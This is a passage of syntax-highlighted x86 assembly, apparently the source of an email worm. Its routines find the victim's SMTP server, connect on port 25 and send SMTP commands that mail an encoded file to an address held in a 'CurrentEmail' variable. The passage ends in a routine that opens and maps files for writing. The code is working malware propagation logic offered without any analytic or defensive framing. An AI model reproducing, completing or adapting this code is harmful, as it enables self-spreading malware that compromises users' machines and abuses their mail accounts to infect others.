      </span><span class="sc6">test</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0">       </span><span class="sc5">GetUserSmtpServerError</span><span class="sc0">        
      </span><span class="sc6">clc</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">       
</span><span class="sc5">GetUserSmtpServerError</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">stc</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;.............. Smtp Connection</span><span class="sc0">
                                                
</span><span class="sc5">SmtpConnection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WSAData</span><span class="sc0">                      </span><span class="sc1">; Struct WSA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">101h</span><span class="sc0">                                </span><span class="sc1">; VERSION1_1</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">WSAStartup</span><span class="sc0">                  </span><span class="sc1">; Socket Init</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; ok ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">WSA_Error</span><span class="sc0">                           </span><span class="sc1">; No, exit with stc </span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">; Protocol = 0 (more sure)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">1</span><span class="sc0">                                   </span><span class="sc1">; SOCK_STREAM</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">2</span><span class="sc0">                                   </span><span class="sc1">; AF_INET (most used)</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">socket</span><span class="sc0">                  </span><span class="sc1">; create socket</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; -1 = error</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Socket_Error</span><span class="sc0">                        </span><span class="sc1">; WSACleanUp and stc</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">hSocket</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">; Socket Handle</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">25</span><span class="sc0">                      </span><span class="sc1">; Smtp port</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">htons</span><span class="sc0">                       </span><span class="sc1">; Convert it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">wsocket</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; The port ( 2 ptr[wsocket]=AF_INET )</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SmtpServeur</span><span class="sc0">                  </span><span class="sc1">; The SMPT Host</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">gethostbyname</span><span class="sc0">               </span><span class="sc1">; SMPT to IP</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; error ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Error_CloseSocket</span><span class="sc4">&amp;</span><span class="sc5">CleanUp</span><span class="sc0">           </span><span class="sc1">; Exit + stc                </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; get ptr 2 IP into HOSTENT</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">; get ptr 2 IP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ServeurIP</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Save it</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">010h</span><span class="sc0">                            </span><span class="sc1">; size of sockaddr struct</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wsocket</span><span class="sc0">                      </span><span class="sc1">; Ptr on it</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc5">hSocket</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">; Handle</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">connect</span><span class="sc0">                 </span><span class="sc1">; connect to smtp server</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Error_CloseSocket</span><span class="sc4">&amp;</span><span class="sc5">CleanUp</span><span class="sc0">           </span><span class="sc1">; Exit + stc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">GetServeurReply</span><span class="sc0">             </span><span class="sc1">; get server response</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Error_CloseSocket</span><span class="sc4">&amp;</span><span class="sc5">CleanUp</span><span class="sc0">           </span><span class="sc1">; If c=0 Connection OK !</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetServeurReply</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">; Flags</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">4</span><span class="sc0">                                   </span><span class="sc1">; Get a LongWord</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ServeurReply</span><span class="sc0">                 </span><span class="sc1">; in ServeurReply</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc5">hSocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">recv</span><span class="sc0">                                </span><span class="sc1">; get stmp server error code</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                              </span><span class="sc1">; Receive a LongWord  </span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ReplyError</span><span class="sc0">                          </span><span class="sc1">; No, stc</span><span class="sc0">

</span><span class="sc5">ServeurReplyLoop</span><span class="sc4">:</span><span class="sc0">   
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ServeurReplyEnd</span><span class="sc0">         </span><span class="sc1">; Get a byte In</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">; Flags</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">1</span><span class="sc0">                                   </span><span class="sc1">; a byte</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc5">hSocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">recv</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ReplyError</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">         </span><span class="sc5">ServeurReplyLoop</span><span class="sc0">                </span><span class="sc1">; skip over CRLF</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ServeurReply</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' 022'</span><span class="sc0">                 
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ReplyOk</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' 052'</span><span class="sc0">                 
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ReplyOk</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' 152'</span><span class="sc0">                 
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ReplyOk</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' 453'</span><span class="sc0">                 
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ReplyError</span><span class="sc0">
</span><span class="sc5">ReplyOk</span><span class="sc4">:</span><span class="sc0">      
      </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ReplyError</span><span class="sc4">:</span><span class="sc0"> 
      </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;.............. Smtp DisConnection</span><span class="sc0">

</span><span class="sc5">SmtpDisConnection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">Error_CloseSocket</span><span class="sc4">&amp;</span><span class="sc5">CleanUp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hSocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">closesocket</span><span class="sc0">
</span><span class="sc5">Socket_Error</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">WSACleanup</span><span class="sc0">        
</span><span class="sc5">WSA_Error</span><span class="sc4">:</span><span class="sc0">  
      </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;.............. Smtp Send</span><span class="sc0">

</span><span class="sc5">SmtpSendCommand</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc5">SendHelloCmd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_helo</span><span class="sc0">                 </span><span class="sc1">; 'HELO xxx',CRLF</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">14</span><span class="sc0">                                  </span><span class="sc1">; cmd size</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; cmd size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">SendSocket</span><span class="sc0">                  </span><span class="sc1">; send HELO command</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">GetServeurReply</span><span class="sc0">                     </span><span class="sc1">; Ok ?</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">          </span><span class="sc5">Error_CloseSocket</span><span class="sc4">&amp;</span><span class="sc5">CleanUp</span><span class="sc0">           </span><span class="sc1">; No</span><span class="sc0">

</span><span class="sc5">SendMailFromCmd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_mailfrom</span><span class="sc0">             </span><span class="sc1">; 'MAIL FROM:&lt;'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">11</span><span class="sc0">                                  </span><span class="sc1">; cmd size</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">SendSocket</span><span class="sc0">                  </span><span class="sc1">; send MAIL FROM command</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mailfrom</span><span class="sc0">                 </span><span class="sc1">; ptr default user email</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">        </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">SendSocket</span><span class="sc0">                          </span><span class="sc1">; 2 Write xxxx@xxxx.xx</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">Brk1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'&gt;'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">Brk1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">SendSocket</span><span class="sc0">                  </span><span class="sc1">; 3 Write '&gt;',CRLF</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">GetServeurReply</span><span class="sc0">                     </span><span class="sc1">; Ok</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Error_CloseSocket</span><span class="sc4">&amp;</span><span class="sc5">CleanUp</span><span class="sc0">           </span><span class="sc1">; No</span><span class="sc0">

</span><span class="sc5">SendRcptToCmd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_rcptto</span><span class="sc0">               </span><span class="sc1">; 'RCPT TO:&lt;'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">9</span><span class="sc0">                                   </span><span class="sc1">; cmd size</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; cmd size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">SendSocket</span><span class="sc0">                      </span><span class="sc1">; 1 Write 'RCPT TO:&lt;'</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurrentEmail</span><span class="sc0">             </span><span class="sc1">; ptr email</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">        </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">SendSocket</span><span class="sc0">                          </span><span class="sc1">; 2 Write xxxx@xxxx.xx</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">Brk2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'&gt;'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">Brk2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">SendSocket</span><span class="sc0">                  </span><span class="sc1">; 3 Write '&gt;',CRLF</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">GetServeurReply</span><span class="sc0">                     </span><span class="sc1">; Ok</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Error_CloseSocket</span><span class="sc4">&amp;</span><span class="sc5">CleanUp</span><span class="sc0">           </span><span class="sc1">; No</span><span class="sc0">

</span><span class="sc5">SendDataCmd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_data</span><span class="sc0">                 </span><span class="sc1">; 'DATA',CRLF</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">6</span><span class="sc0">                                   </span><span class="sc1">; Size</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; Size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">SendSocket</span><span class="sc0">                  </span><span class="sc1">; send DATA command</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">GetServeurReply</span><span class="sc0">                     </span><span class="sc1">; Ok</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Error_CloseSocket</span><span class="sc4">&amp;</span><span class="sc5">CleanUp</span><span class="sc0">           </span><span class="sc1">; No</span><span class="sc0">

</span><span class="sc5">SendeMailBody</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">MemMessageBody1</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Start Message Body</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">MessageSize1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">SendSocket</span><span class="sc0">               

      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MemEncoded</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Encoded File</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncodedFileSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">SendSocket</span><span class="sc0">       

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MessageBody2</span><span class="sc0">            </span><span class="sc1">; End Message Body</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MessageSize2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">SendSocket</span><span class="sc0">                     

</span><span class="sc5">SendTermCmd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_term</span><span class="sc0">                 </span><span class="sc1">; CRLF,'.',CRLF</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">5</span><span class="sc0">                                   </span><span class="sc1">; size</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">SendSocket</span><span class="sc0">                  </span><span class="sc1">; send message header+body</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">GetServeurReply</span><span class="sc0">                     </span><span class="sc1">; Ok ?</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Error_CloseSocket</span><span class="sc4">&amp;</span><span class="sc5">CleanUp</span><span class="sc0">           </span><span class="sc1">; No</span><span class="sc0">

</span><span class="sc5">SendQuitCmd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_quit</span><span class="sc0">                 </span><span class="sc1">; 'QUIT',CRLF</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">6</span><span class="sc0">                                   </span><span class="sc1">; size</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">SendSocket</span><span class="sc0">                  </span><span class="sc1">; send QUIT command</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
      </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">SendSocket</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">; Flags</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">; Source</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc5">hSocket</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">; Handle</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">send</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span><span class="sc0">
</span><span class="sc1">;........................ Minor Sub Routine ..................................</span><span class="sc0">
</span><span class="sc1">;............................ Z O N E ........................................</span><span class="sc0">
</span><span class="sc1">;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span><span class="sc0">


</span><span class="sc1">;........................ Open &amp; Map a File ..................................</span><span class="sc0">
</span><span class="sc1">;.............................................................................</span><span class="sc0">


</span><span class="sc1">; IN:           TempPath&amp;Name = Path + Name of file to Open</span><span class="sc0">
</span><span class="sc1">; OUT:      fhandle, maphandle, mapaddress</span><span class="sc0">
</span><span class="sc1">;           cf = 0 ou 1</span><span class="sc0">

</span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">       
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">CreateFileA</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFileError</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">                             
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">                  
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhandle</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                       
      </span><span class="sc6">jz</span><span class="sc0">        </span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFileCloseFileHandle</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">maphandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc0">                             
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">              
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
